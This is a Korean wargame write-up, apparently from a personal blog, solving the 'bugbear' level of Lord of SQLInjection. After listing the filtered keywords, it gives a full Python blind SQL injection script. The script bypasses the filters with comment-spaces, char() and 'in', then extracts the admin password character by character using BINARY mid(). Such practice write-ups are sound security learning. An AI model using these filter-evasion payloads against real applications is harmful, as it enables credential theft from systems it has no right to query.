---
title: "Lord of SQLInjection - BUGBEAR"
categories: 
  - SQLi
tags:
  - SQLi
  - 웹해킹
toc: true
---

# BUGBEAR
## 문제 
![img](/assets/images/los/bugbear1.png)

- 따옴표('), substr, ascii, =, or, and, 공백(' '), like, hex(0x)를 필터링 한다.

## 정답
![img](/assets/images/los/bugbear2.png)

> mysql에서 mid(), substr()등의 함수로 string을 자른 후 비교시 대소문자를 구별하지 못한다. 이럴땐 구별할 문자 앞에 BINARY를 붙여주면 대소문자를 구별할 수 있다. 아래 코드의 두번째 쿼리에 적용되어 있다.

![img](/assets/images/los/bugbear3.png)

```python
import requests

password = ''

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

cookie = {'PHPSESSID' : 'PHP 세션 아이디'}

pass_len = 0

for length in range(1,30):
    query = "?pw=1&no=0/**/||/**/id/**/in/**/(char(97,100,109,105,110))/**/%%26%%26/**/%d/**/in/**/(length(pw))" %length
    URL = url+query

    r = requests.get(url=URL, cookies=cookie)

    if 'Hello admin' in str(r.content):
        pass_len = length
        break

    else:
        print(str(length) + "--- X")
		

print("password length : %d" %pass_len)
password=''

for i in range(1, pass_len+1):
    for j in range(38, 127):
        query = "?pw=1&no=0/**/||/**/id/**/in/**/(char(97,100,109,105,110))/**/%%26%%26/**/BINARY/**/mid(pw,%d,1)/**/in/**/(char(%d))" %(i, j)
        URL = url+query
        r = requests.get(url=URL, cookies=cookie)
        
        if 'Hello admin' in str(r.content):
            password += chr(j)
            break

print ('passowrd :  %s' %password)
```